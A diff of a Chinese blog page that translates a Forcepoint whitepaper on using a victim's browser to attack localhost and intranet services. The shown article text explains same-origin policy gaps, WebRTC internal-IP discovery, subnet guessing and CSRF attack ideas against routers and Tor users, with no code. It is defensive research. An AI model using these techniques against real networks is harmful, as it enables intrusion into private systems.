@@ -14,60 +14,81 @@
 
 
 
-  
-  <meta name="author" content="Neal" />
-  <meta name="description" content="介绍 在 Forcepoint，我们不断寻求改善我们产品所提供的防护。为此，我们经常研究不寻常或潜在新颖的攻击技术。最近的一个研究课题是从公网发起的针对 localhost 和内网的攻击。
-虽然不是新的攻击，但在安全研究社区之外，恶意 JavaScript 可以攻击内网并不广为人知。在关于该主题的有限文档中，大多数资源是从 inter-protol(协议间)漏洞来描述 [1] [2]，而我们的重点是 intra-protol(协议内部)的漏洞。我们发现没有一站式资源从协议内部攻击的角度去描述这种攻击，并且在白皮书中收集这些技术是为了填补关于这些攻击文档的空白，以及让被低估的攻击面受到关注。
-由于浏览器默认可以访问 localhost 以及本地局域网，因此这些攻击可以绕过潜在的本地基于主机的防火墙以及企业/消费者外围防火墙。
-恶意攻击者了解这些攻击，但防守者也需要被告知。除了描述攻击的技术细节之外，我们还将讨论检测和防范攻击的方法。
-可疑行为：公网到局域网的连接 从恶意站点加载的 JavaScript 可以在许多情况下能够连接用户本地计算机（localhost）或其他内部主机上运行的服务。现代 Web 浏览器不能完全阻止使用受害者浏览器作为代理攻击内网。事实上，我们不仅可以让受害者浏览器在内部发送请求，而且我们还可以发现内部主机，进行有限端口扫描，进行服务指纹识别，最后我们甚至可以通过恶意 JavaScript 来攻击易受攻击的服务。
-如果从公网获取的网页尝试访问未路由的 IP 地址（例如 localhost 或内部网络），则应将其视为可疑行为。通过我们的遥测技术，我们还没有发现过存在于公网上的良性网页需要连接到私有 IP 地址，我们也没有发现任何有效和合理的业务用例来做这样的事情。是否有必要允许公网上的网页连接到私有 IP 地址，而不是在某些边缘情况下，这是值得怀疑的。一个边缘情况可能是在内部网络上使用公共 IP 地址的不常见设置。（但必须允许相反的方向的情况，因为许多内部页面可能出于完全正当的原因而获取外部资源。）
-这种可疑行为与攻击链的各个部分一起具有某些特征，可以用于检测目的建模。我们稍后将回到更详细的关于检测的讨论，因为如果我们先了解攻击链的技术细节，检测就更有意义了。
-在进行威胁建模时，开发者通常认为本地服务永远不会接收外部输入，因此通常缺乏对这些服务的安全审核。可能通过远程托管的恶意 JavaScript 攻击易受攻击的本地服务的最新示例是 Logitech Options 应用开启易受攻击的 WebSocket 服务器 [3]。通过远程跨域 JavaScript 进行的本地攻击代表了一种被低估的攻击面。
-同源策略不会阻止本地攻击吗？ 实际上，同源策略（SOP）[4]在很多情况下确实可以防范这种攻击，但正如我们看到的，仍然存在攻击可能成功的情况。尽管有相关文档，通常被忽略的事实是同源策略并不会阻止浏览器发出跨域请求，它只能阻止 JavaScript 读取响应。（同源策略允许嵌入跨域资源，如图像和 JavaScript，但这是另外一方面的内容。）对于攻击某些易受攻击的服务，它可能足以能够盲目地发送恶意请求以达到攻击者的目的。
-Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和写入，但不允许读取。允许跨域写入的事实使得可能执行以下攻击：
-受害者在互联网上浏览恶意页面。页面上的 JavaScript 根据同源策略向不应与之通信的内部服务器发出异步请求(XMLHttpRequest)。 然而，浏览器将发送请求（此时服务器被利用）。 浏览器收到响应但不会将其传递给 JavaScript。 那跨域资源共享呢？ 我们要展示的攻击与跨域资源共享(CORS) [5] 无关，只与同源策略相关。在本白皮书中，我们可以假设不允许跨域资源共享请求，这意味着我们拥有最严格的设置，其中同源策略“阻止”所有内容。即使面对同源策略，我们也可以进行攻击。
-攻击概述 我们将看一下使用受害者的浏览器作为代理，外部站点上的 JavaScript 如何攻击运行在 localhost 或内网中的易受攻击的服务的示例。作为概述，我们将看看以下步骤：
-" />
+
 
   
+    
   
 
-  
-  <meta property="og:type" content="article" />
-  <meta property="og:title" content="使用浏览器作为代理从公网攻击内网" />
-  <meta property="og:description" content="介绍 在 Forcepoint，我们不断寻求改善我们产品所提供的防护。为此，我们经常研究不寻常或潜在新颖的攻击技术。最近的一个研究课题是从公网发起的针对 localhost 和内网的攻击。
-虽然不是新的攻击，但在安全研究社区之外，恶意 JavaScript 可以攻击内网并不广为人知。在关于该主题的有限文档中，大多数资源是从 inter-protol(协议间)漏洞来描述 [1] [2]，而我们的重点是 intra-protol(协议内部)的漏洞。我们发现没有一站式资源从协议内部攻击的角度去描述这种攻击，并且在白皮书中收集这些技术是为了填补关于这些攻击文档的空白，以及让被低估的攻击面受到关注。
-由于浏览器默认可以访问 localhost 以及本地局域网，因此这些攻击可以绕过潜在的本地基于主机的防火墙以及企业/消费者外围防火墙。
-恶意攻击者了解这些攻击，但防守者也需要被告知。除了描述攻击的技术细节之外，我们还将讨论检测和防范攻击的方法。
-可疑行为：公网到局域网的连接 从恶意站点加载的 JavaScript 可以在许多情况下能够连接用户本地计算机（localhost）或其他内部主机上运行的服务。现代 Web 浏览器不能完全阻止使用受害者浏览器作为代理攻击内网。事实上，我们不仅可以让受害者浏览器在内部发送请求，而且我们还可以发现内部主机，进行有限端口扫描，进行服务指纹识别，最后我们甚至可以通过恶意 JavaScript 来攻击易受攻击的服务。
-如果从公网获取的网页尝试访问未路由的 IP 地址（例如 localhost 或内部网络），则应将其视为可疑行为。通过我们的遥测技术，我们还没有发现过存在于公网上的良性网页需要连接到私有 IP 地址，我们也没有发现任何有效和合理的业务用例来做这样的事情。是否有必要允许公网上的网页连接到私有 IP 地址，而不是在某些边缘情况下，这是值得怀疑的。一个边缘情况可能是在内部网络上使用公共 IP 地址的不常见设置。（但必须允许相反的方向的情况，因为许多内部页面可能出于完全正当的原因而获取外部资源。）
-这种可疑行为与攻击链的各个部分一起具有某些特征，可以用于检测目的建模。我们稍后将回到更详细的关于检测的讨论，因为如果我们先了解攻击链的技术细节，检测就更有意义了。
-在进行威胁建模时，开发者通常认为本地服务永远不会接收外部输入，因此通常缺乏对这些服务的安全审核。可能通过远程托管的恶意 JavaScript 攻击易受攻击的本地服务的最新示例是 Logitech Options 应用开启易受攻击的 WebSocket 服务器 [3]。通过远程跨域 JavaScript 进行的本地攻击代表了一种被低估的攻击面。
-同源策略不会阻止本地攻击吗？ 实际上，同源策略（SOP）[4]在很多情况下确实可以防范这种攻击，但正如我们看到的，仍然存在攻击可能成功的情况。尽管有相关文档，通常被忽略的事实是同源策略并不会阻止浏览器发出跨域请求，它只能阻止 JavaScript 读取响应。（同源策略允许嵌入跨域资源，如图像和 JavaScript，但这是另外一方面的内容。）对于攻击某些易受攻击的服务，它可能足以能够盲目地发送恶意请求以达到攻击者的目的。
-Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和写入，但不允许读取。允许跨域写入的事实使得可能执行以下攻击：
-受害者在互联网上浏览恶意页面。页面上的 JavaScript 根据同源策略向不应与之通信的内部服务器发出异步请求(XMLHttpRequest)。 然而，浏览器将发送请求（此时服务器被利用）。 浏览器收到响应但不会将其传递给 JavaScript。 那跨域资源共享呢？ 我们要展示的攻击与跨域资源共享(CORS) [5] 无关，只与同源策略相关。在本白皮书中，我们可以假设不允许跨域资源共享请求，这意味着我们拥有最严格的设置，其中同源策略“阻止”所有内容。即使面对同源策略，我们也可以进行攻击。
-攻击概述 我们将看一下使用受害者的浏览器作为代理，外部站点上的 JavaScript 如何攻击运行在 localhost 或内网中的易受攻击的服务的示例。作为概述，我们将看看以下步骤：
-" />
-  <meta property="og:url" content="https://madneal.com/post/%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BD%9C%E4%B8%BA%E4%BB%A3%E7%90%86%E4%BB%8E%E5%85%AC%E7%BD%91%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91/" />
-  <meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
 
 
 
+<meta name="author" content="Neal" />
+<meta name="description" content=" 介绍 在 Forcepoint，我们不断寻求改善我们产品所提供的防护。为此，我们经常研究不寻常或潜在新颖的攻击技术。最近的一个研究课题是从公网发起的针对 localhost 和内网的攻击。 虽然不是新的攻击，但在安全研究社区之外，恶意 JavaScript 可以攻击内网并不广为人知。在关于该主题的有限文档中，大多数资 …" />
+<meta name="generator" content="Hugo 0.145.0" />
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="使用浏览器作为代理从公网攻击内网" />
+<meta property="og:description" content=" 介绍 在 Forcepoint，我们不断寻求改善我们产品所提供的防护。为此，我们经常研究不寻常或潜在新颖的攻击技术。最近的一个研究课题是从公网发起的针对 localhost 和内网的攻击。 虽然不是新的攻击，但在安全研究社区之外，恶意 JavaScript 可以攻击内网并不广为人知。在关于该主题的有限文档中，大多数资 …" />
+<meta property="og:url" content="https://madneal.com/post/%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BD%9C%E4%B8%BA%E4%BB%A3%E7%90%86%E4%BB%8E%E5%85%AC%E7%BD%91%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91/" />
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
+<meta property="og:site_name" content="Neal&#39;s Blog" />
+
+<meta property="article:published_time" content="2019-04-15T00:00:00Z" />
+<meta property="article:modified_time" content="2019-04-15T00:00:00Z" />
+<meta property="article:tag" content="安全" />
+<meta property="article:tag" content="Web安全" />
+<meta property="article:tag" content="漏洞分析" />
+
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:site" content="@gohugoio" />
+<meta name="twitter:title" content="使用浏览器作为代理从公网攻击内网" />
+<meta name="twitter:description" content=" 介绍 在 Forcepoint，我们不断寻求改善我们产品所提供的防护。为此，我们经常研究不寻常或潜在新颖的攻击技术。最近的一个研究课题是从公网发起的针对 localhost 和内网的攻击。 虽然不是新的攻击，但在安全研究社区之外，恶意 JavaScript 可以攻击内网并不广为人知。在关于该主题的有限文档中，大多数资 …" />
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "\"使用浏览器作为代理从公网攻击内网\"",
+  "description": "\" 介绍 在 Forcepoint，我们不断寻求改善我们产品所提供的防护。为此，我们经常研究不寻常或潜在新颖的攻击技术。最近的一个研究课题是从公网发起的针对 localhost 和内网的攻击。 虽然不是新的攻击，但在安全研究社区之外，恶意 JavaScript 可以攻击内网并不广为人知。在关于该主题的有限文档中，大多数资 …\"",
+  "url": "\"https://madneal.com/post/%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BD%9C%E4%B8%BA%E4%BB%A3%E7%90%86%E4%BB%8E%E5%85%AC%E7%BD%91%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91/\"",
+  "datePublished": "\"2019-04-15T00:00:00Z\"",
+  "dateModified": "\"2019-04-15T00:00:00Z\"",
+  "author": {
+    "@type": "Person",
+    "name": "\"Neal\""
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "\"Neal's Blog\"",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "\"https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg\""
+    }
+  },
+  "image": "\"https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg\""
+}
+</script>
 
 
 
 <link rel="canonical" href="https://madneal.com/post/%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BD%9C%E4%B8%BA%E4%BB%A3%E7%90%86%E4%BB%8E%E5%85%AC%E7%BD%91%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91/" />
-<link rel="alternative" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/index.xml" title="Neal&#39;s Blog" type="application/atom+xml" />
+<link rel="alternate" href="https://madneal.com/index.xml" title="Neal&#39;s Blog" type="application/rss+xml" />
 
 
 <meta name="renderer" content="webkit" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<meta name="format-detection" content="telephone=no,email=no,adress=no" />
+<meta name="format-detection" content="telephone=no,email=no,address=no" />
 <meta http-equiv="Cache-Control" content="no-transform" />
 
 
-<meta content="" name="keywords">
+
 <meta name="robots" content="index,follow" />
 <meta name="referrer" content="origin-when-cross-origin" />
 <meta name="google-site-verification" content="_moDmnnBNVLBN1rzNxyGUGdPHE20YgbmrtzLIbxaWFc" />
@@ -95,16 +116,17 @@ Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和
 
 
 
-<link rel="stylesheet" href="//cdn.bootcss.com/video.js/6.2.8/alt/video-js-cdn.min.css" />
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/css/bundle.css" />
+<style>
+.wechat-qr{width:15rem;height:15rem;margin:0 auto 1.5rem}@media screen and (max-width:800px){.wechat-qr{display:none}}.menu-toggle:focus{color:#5fbf5e}.post-detail .post-toc{margin:0 0 2rem;padding:1rem 1.25rem;border-left:3px solid #5fbf5e;background:#f4f3f1;font-size:.95rem}.post-detail .post-toc h2{margin:0 0 .5rem;font-size:1rem}.post-detail .post-toc ul,.post-detail .post-toc ol{margin:.25rem 0;padding-left:1.25rem}.post-detail .post-toc a{color:#4a4a4a}.post-detail .post-toc a:hover{color:#5fbf5e}.post-detail .post-footer .wechat-card{margin:2rem 0;padding:1rem;border-radius:5px;background:#f4f3f1;text-align:center}.post-detail .post-footer .wechat-card p{margin-top:0}.post-detail .post-footer .wechat-card img{width:12rem;height:12rem}.post-content h1 .heading-anchor,.post-content h2 .heading-anchor,.post-content h3 .heading-anchor,.post-content h4 .heading-anchor,.post-content h5 .heading-anchor,.post-content h6 .heading-anchor{margin-left:.25rem;border-bottom:none;color:#b5b5b5;font-size:.75em;opacity:0;transition:opacity .5s ease-out,color .5s ease-out}.post-content h1:hover .heading-anchor,.post-content h2:hover .heading-anchor,.post-content h3:hover .heading-anchor,.post-content h4:hover .heading-anchor,.post-content h5:hover .heading-anchor,.post-content h6:hover .heading-anchor,.post-content .heading-anchor:focus{opacity:1}.post-content .heading-anchor:hover,.post-content .heading-anchor:focus{color:#5fbf5e;border-bottom:none}.post-content pre{position:relative}.post-content pre .code-copy{position:absolute;top:.5rem;right:.5rem;padding:.2rem .45rem;border:1px solid #dbdbdb;border-radius:2px;background:#fafafa;color:#797979;font-size:.8rem;cursor:pointer;opacity:0;transition:opacity .5s ease-out,color .5s ease-out}.post-content pre:hover .code-copy,.post-content pre .code-copy:focus{opacity:1}.post-content pre .code-copy:hover,.post-content pre .code-copy:focus{color:#5fbf5e}.post-content table{display:block;overflow-x:auto}
+</style>
 
 
   
   <!--[if lt IE 9]>
     <script src="//cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
     <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
-    <script src="//cdn.bootcss.com/video.js/6.2.8/ie8/videojs-ie8.min.js"></script>
   <![endif]-->
 
 <!--[if lte IE 11]>
@@ -132,15 +154,15 @@ Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和
     
     
   <header class="site-header">
-  <img class="avatar" src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" alt="Avatar">
+  <img class="avatar" src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" alt="Avatar" width="128" height="128" decoding="async">
   
   <h2 class="title">Neal&#39;s Blog</h2>
   
   <p class="subtitle">Development &amp; Security</p>
-  <button class="menu-toggle" type="button">
+  <button class="menu-toggle" type="button" aria-controls="site-menu social-menu" aria-expanded="false" aria-label="Toggle navigation">
     <span class="icon icon-menu"></span>
   </button>
-  <nav class="site-menu collapsed">
+  <nav id="site-menu" class="site-menu collapsed">
     <h2 class="offscreen">Main Menu</h2>
     <ul class="menu-list">
       
@@ -172,8 +194,8 @@ Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和
       
     </ul>
   </nav>
-  <img src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/wechat.jpg" alt="wechat" style="width: 240px;height: 240px;">
-  <nav class="social-menu collapsed">
+  <img class="wechat-qr" src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/wechat.jpg" alt="wechat" width="240" height="240" loading="lazy" decoding="async">
+  <nav id="social-menu" class="social-menu collapsed">
     <h2 class="offscreen">Social Networks</h2>
     <ul class="social-list">
 
@@ -238,19 +260,69 @@ Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和
   <section class="main post-detail">
     <header class="post-header">
       <h1 class="post-title">使用浏览器作为代理从公网攻击内网</h1>
-      <p class="post-meta">@Neal · Apr 15, 2019 · 6 min read</p>
+      <p class="post-meta">@Neal · <time datetime="2019-04-15">2019-04-15</time> · 约 6 分钟阅读</p>
     </header>
-    <article class="post-content"><h2 id="介绍">介绍</h2>
+    
+      <nav class="post-toc" aria-label="文章目录">
+        <h2>目录</h2>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#介绍">介绍</a></li>
+    <li><a href="#可疑行为公网到局域网的连接">可疑行为：公网到局域网的连接</a>
+      <ul>
+        <li><a href="#同源策略不会阻止本地攻击吗">同源策略不会阻止本地攻击吗？</a></li>
+        <li><a href="#那跨域资源共享呢">那跨域资源共享呢？</a></li>
+      </ul>
+    </li>
+    <li><a href="#攻击概述">攻击概述</a>
+      <ul>
+        <li><a href="#潜在的类似攻击">潜在的类似攻击</a></li>
+        <li><a href="#协议间的漏洞">协议间的漏洞</a></li>
+      </ul>
+    </li>
+    <li><a href="#侦察">侦察</a>
+      <ul>
+        <li><a href="#找到受害者的内部-ip-地址">找到受害者的内部 IP 地址</a></li>
+        <li><a href="#基于内网实现对其他主机的探测">基于内网实现对其他主机的探测</a></li>
+        <li><a href="#通过端口扫描验证主机是否存在">通过端口扫描验证主机是否存在</a></li>
+        <li><a href="#使用默认文件查找在开放端口上运行的服务">使用默认文件查找在开放端口上运行的服务</a></li>
+      </ul>
+    </li>
+    <li><a href="#通过-xss-浏览内部网络并更改页面源origin">通过 XSS 浏览内部网络并更改页面源(origin)</a></li>
+    <li><a href="#攻击本地运行的-jenkins">攻击本地运行的 Jenkins</a>
+      <ul>
+        <li><a href="#用我们的-jenkins-实例做实验">用我们的 Jenkins 实例做实验</a></li>
+        <li><a href="#选择攻击方式">选择攻击方式</a></li>
+        <li><a href="#通过-dns-验证命令盲注技术">通过 DNS 验证命令盲注技术</a></li>
+        <li><a href="#执行攻击并进行验证">执行攻击并进行验证</a></li>
+      </ul>
+    </li>
+    <li><a href="#简要的攻击链分析">简要的攻击链分析</a></li>
+    <li><a href="#本地可疑行为的检测表示本地攻击">本地可疑行为的检测表示本地攻击</a></li>
+    <li><a href="#防护">防护</a>
+      <ul>
+        <li><a href="#对于不同角色人群的防护建议">对于不同角色人群的防护建议</a></li>
+        <li><a href="#确保你的应用无法攻击其它应用">确保你的应用无法攻击其它应用</a></li>
+        <li><a href="#对于防护的总结">对于防护的总结</a></li>
+      </ul>
+    </li>
+    <li><a href="#总结">总结</a></li>
+    <li><a href="#资源">资源</a></li>
+  </ul>
+</nav>
+      </nav>
+    
+    <article class="post-content"><h2 id="介绍">介绍 <a class="heading-anchor" href="#%e4%bb%8b%e7%bb%8d" aria-label="链接到本节">#</a></h2>
 <p>在 Forcepoint，我们不断寻求改善我们产品所提供的防护。为此，我们经常研究不寻常或潜在新颖的攻击技术。最近的一个研究课题是从公网发起的针对 localhost 和内网的攻击。</p>
 <p>虽然不是新的攻击，但在安全研究社区之外，恶意 JavaScript 可以攻击内网并不广为人知。在关于该主题的有限文档中，大多数资源是从 inter-protol(协议间)漏洞来描述 [1] [2]，而我们的重点是 intra-protol(协议内部)的漏洞。我们发现没有一站式资源从协议内部攻击的角度去描述这种攻击，并且在白皮书中收集这些技术是为了填补关于这些攻击文档的空白，以及让被低估的攻击面受到关注。</p>
 <p>由于浏览器默认可以访问 localhost 以及本地局域网，因此这些攻击可以绕过潜在的本地基于主机的防火墙以及企业/消费者外围防火墙。</p>
 <p>恶意攻击者了解这些攻击，但防守者也需要被告知。除了描述攻击的技术细节之外，我们还将讨论检测和防范攻击的方法。</p>
-<h2 id="可疑行为公网到局域网的连接">可疑行为：公网到局域网的连接</h2>
+<h2 id="可疑行为公网到局域网的连接">可疑行为：公网到局域网的连接 <a class="heading-anchor" href="#%e5%8f%af%e7%96%91%e8%a1%8c%e4%b8%ba%e5%85%ac%e7%bd%91%e5%88%b0%e5%b1%80%e5%9f%9f%e7%bd%91%e7%9a%84%e8%bf%9e%e6%8e%a5" aria-label="链接到本节">#</a></h2>
 <p>从恶意站点加载的 JavaScript 可以在许多情况下能够连接用户本地计算机（localhost）或其他内部主机上运行的服务。现代 Web 浏览器不能完全阻止使用受害者浏览器作为代理攻击内网。事实上，我们不仅可以让受害者浏览器在内部发送请求，而且我们还可以发现内部主机，进行有限端口扫描，进行服务指纹识别，最后我们甚至可以通过恶意 JavaScript 来攻击易受攻击的服务。</p>
 <p>如果从公网获取的网页尝试访问未路由的 IP 地址（例如 localhost 或内部网络），则应将其视为可疑行为。通过我们的遥测技术，我们还没有发现过存在于公网上的良性网页需要连接到私有 IP 地址，我们也没有发现任何有效和合理的业务用例来做这样的事情。是否有必要允许公网上的网页连接到私有 IP 地址，而不是在某些边缘情况下，这是值得怀疑的。一个边缘情况可能是在内部网络上使用公共 IP 地址的不常见设置。（但必须允许相反的方向的情况，因为许多内部页面可能出于完全正当的原因而获取外部资源。）</p>
 <p>这种可疑行为与攻击链的各个部分一起具有某些特征，可以用于检测目的建模。我们稍后将回到更详细的关于检测的讨论，因为如果我们先了解攻击链的技术细节，检测就更有意义了。</p>
 <p>在进行威胁建模时，开发者通常认为本地服务永远不会接收外部输入，因此通常缺乏对这些服务的安全审核。可能通过远程托管的恶意 JavaScript 攻击易受攻击的本地服务的最新示例是 Logitech Options 应用开启易受攻击的 WebSocket 服务器 [3]。通过远程跨域 JavaScript 进行的本地攻击代表了一种被低估的攻击面。</p>
-<h3 id="同源策略不会阻止本地攻击吗">同源策略不会阻止本地攻击吗？</h3>
+<h3 id="同源策略不会阻止本地攻击吗">同源策略不会阻止本地攻击吗？ <a class="heading-anchor" href="#%e5%90%8c%e6%ba%90%e7%ad%96%e7%95%a5%e4%b8%8d%e4%bc%9a%e9%98%bb%e6%ad%a2%e6%9c%ac%e5%9c%b0%e6%94%bb%e5%87%bb%e5%90%97" aria-label="链接到本节">#</a></h3>
 <p>实际上，同源策略（SOP）[4]在很多情况下确实可以防范这种攻击，但正如我们看到的，仍然存在攻击可能成功的情况。尽管有相关文档，通常被忽略的事实是同源策略并不会阻止浏览器发出跨域请求，它只能阻止 JavaScript 读取响应。（同源策略允许嵌入跨域资源，如图像和 JavaScript，但这是另外一方面的内容。）对于攻击某些易受攻击的服务，它可能足以能够盲目地发送恶意请求以达到攻击者的目的。</p>
 <p>Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和写入，但不允许读取。允许跨域写入的事实使得可能执行以下攻击：</p>
 <ol>
@@ -258,9 +330,9 @@ Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和
 <li>然而，浏览器将发送请求（此时服务器被利用）。</li>
 <li>浏览器收到响应但不会将其传递给 JavaScript。</li>
 </ol>
-<h3 id="那跨域资源共享呢">那跨域资源共享呢？</h3>
+<h3 id="那跨域资源共享呢">那跨域资源共享呢？ <a class="heading-anchor" href="#%e9%82%a3%e8%b7%a8%e5%9f%9f%e8%b5%84%e6%ba%90%e5%85%b1%e4%ba%ab%e5%91%a2" aria-label="链接到本节">#</a></h3>
 <p>我们要展示的攻击与跨域资源共享(CORS) [5] 无关，只与同源策略相关。在本白皮书中，我们可以假设不允许跨域资源共享请求，这意味着我们拥有最严格的设置，其中同源策略“阻止”所有内容。即使面对同源策略，我们也可以进行攻击。</p>
-<h2 id="攻击概述">攻击概述</h2>
+<h2 id="攻击概述">攻击概述 <a class="heading-anchor" href="#%e6%94%bb%e5%87%bb%e6%a6%82%e8%bf%b0" aria-label="链接到本节">#</a></h2>
 <p>我们将看一下使用受害者的浏览器作为代理，外部站点上的 JavaScript 如何攻击运行在 localhost 或内网中的易受攻击的服务的示例。作为概述，我们将看看以下步骤：</p>
 <ol>
 <li>侦察绕过同源策略的方法：查找受害者的私有 IP 地址，查找内部主机，查找开放端口，查找在开放端口上运行的服务。</li>
@@ -276,7 +348,7 @@ Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和
 <li>如果服务需要身份验证，则受害者当前必须已经登录。</li>
 </ul>
 <p>虽然侦察部分采用了相当普遍的技术，但通过 CSRF 的攻击将针对特定的应用程序或设备。因此，对于没有特定目标的攻击，攻击者的最佳选择是攻击一些常用的应用程序，或者家庭路由器。许多家用路由器都有 CSRF 漏洞，很少及时更新补丁，而且它们通常使用已知的静态 IP 地址 - 这些属性使它们易于定位。易受攻击的家庭路由器的例子可以在网上找到 [8]。</p>
-<h3 id="潜在的类似攻击">潜在的类似攻击</h3>
+<h3 id="潜在的类似攻击">潜在的类似攻击 <a class="heading-anchor" href="#%e6%bd%9c%e5%9c%a8%e7%9a%84%e7%b1%bb%e4%bc%bc%e6%94%bb%e5%87%bb" aria-label="链接到本节">#</a></h3>
 <p>为简洁起见，我们仅阐述上述攻击，但我们还有许多其他攻击机会，例如：</p>
 <ul>
 <li>通过 CSRF 更改受害者路由器的管理员密码，或更改路由器配置。</li>
@@ -285,18 +357,19 @@ Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和
 <li>使用定时侧通道攻击（泄漏页面加载时间）进行盲跨域 SQL 注入。</li>
 <li>如果 TOR 浏览器配置不安全，则允许与本地局域网通信，这可能会用于对用户进行去匿名化。可以对 TOR 用户的路由器进行 CSRF 攻击，使其对某些外部主机执行 ping 操作，从而显示公共 IP 地址。</li>
 </ul>
-<h3 id="协议间的漏洞">协议间的漏洞</h3>
+<h3 id="协议间的漏洞">协议间的漏洞 <a class="heading-anchor" href="#%e5%8d%8f%e8%ae%ae%e9%97%b4%e7%9a%84%e6%bc%8f%e6%b4%9e" aria-label="链接到本节">#</a></h3>
 <p>值得注意的是，由于协议间漏洞 [9] [10] [11]，攻击机会不一定限于 HTTP/HTTPS 服务。由于不同的供应商有时会以不同的方式解释 RFC，因此协议通常会忽略错误。将 HTTP 的 POST 请求发送到不同的协议可能会导致其他服务忽略它不理解的 HTTP 头，并且只对有效负载起作用。</p>
 <p>除了在讲述不同协议的服务上运行完全合法的命令之外，如果存在合适的漏洞，则可以利用该服务来获得任意代码执行（例如，通过缓存溢出）。虽然现代浏览器比旧版浏览器更不容易受到协议间漏洞的影响，但由于现代浏览器默认将其他协议的许多常见端口 [12] 列入黑名单，但仍允许使用很多端口。此外，通过恶意浏览器扩展，攻击者可以禁用任何端口的黑名单。可能受到协议间漏洞攻击的设备的一个例子是 WIFICAM 网络摄像机 [13]，它具有易受攻击的 telnet 服务以及弱静态密码（通过浏览器绕过黑名单端口绕过来利用）。</p>
-<h2 id="侦察">侦察</h2>
+<h2 id="侦察">侦察 <a class="heading-anchor" href="#%e4%be%a6%e5%af%9f" aria-label="链接到本节">#</a></h2>
 <p>为了利用某些东西，我们首先需要进行侦察来找出目标上易受攻击的目标。让我们看看如何解决同源策略相关问题。</p>
-<h3 id="找到受害者的内部-ip-地址">找到受害者的内部 IP 地址</h3>
+<h3 id="找到受害者的内部-ip-地址">找到受害者的内部 IP 地址 <a class="heading-anchor" href="#%e6%89%be%e5%88%b0%e5%8f%97%e5%ae%b3%e8%80%85%e7%9a%84%e5%86%85%e9%83%a8-ip-%e5%9c%b0%e5%9d%80" aria-label="链接到本节">#</a></h3>
 <p>受害者的机器将始终回复 IP 地址 127.0.0.1，这对我们很有用。除此之外，了解受害者的机器在内网进行通信时使用的 IP 地址是有益的。原因是知道内部 IP 地址将允许我们对附近的其他主机进行更有针对性的搜索。</p>
 <p>JavaScript 可以使用 WebRTC API 找出受害者的内部 IP 地址。 可以在 Ipcalf [14] 找到对此的概念证明。它不适用于浏览器和平台的所有组合，但这是在 Linux上 中运行 Chrome 时的样子：</p>
-<p><img src="https://s2.ax1x.com/2019/04/08/A4hg6e.png" alt="A4hg6e.png"></p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A4hg6e.png" alt="A4hg6e.png" loading="lazy" decoding="async">
+</p>
 <p><strong>图例 1</strong>: 使用 JavaScript 显示内部 IP 地址</p>
 <p>通过恶意 JavaScript 实现的这种技术可能会将有关内部 IP 地址的信息发送给攻击者。</p>
-<h3 id="基于内网实现对其他主机的探测">基于内网实现对其他主机的探测</h3>
+<h3 id="基于内网实现对其他主机的探测">基于内网实现对其他主机的探测 <a class="heading-anchor" href="#%e5%9f%ba%e4%ba%8e%e5%86%85%e7%bd%91%e5%ae%9e%e7%8e%b0%e5%af%b9%e5%85%b6%e4%bb%96%e4%b8%bb%e6%9c%ba%e7%9a%84%e6%8e%a2%e6%b5%8b" aria-label="链接到本节">#</a></h3>
 <p>在找到开放端口和可能易受攻击的服务之前，我们需要找出内网中存活的主机。为此，我们接下来将对内部 IP 地址和主机名进行探测。这对于即使非特定目标的攻击也非常有效。 <em>请注意，在这个阶段我们只是猜测这些 IP 地址和主机名;稍后我们将通过技术验证我们的猜测是否正确</em>。</p>
 <p>消费者和低端企业网络设备（如 ADSL 调制解调器和路由器）的一些常见默认地址范围是 192.168.0.0/24,192.168.1.0/24 和 192.168.8.0/24。无论是在家庭还是在小型企业网络上，用户很可能位于其中一个子网中。</p>
 <p>此外，许多低端 DHCP 服务器默认分配从八位字节开始的 IP 地址，因此有一个有根据的猜测是，我们可能会在地址 192.168.0.100-105 找到其他内部主机，对于上面列出的子网也是类似的。</p>
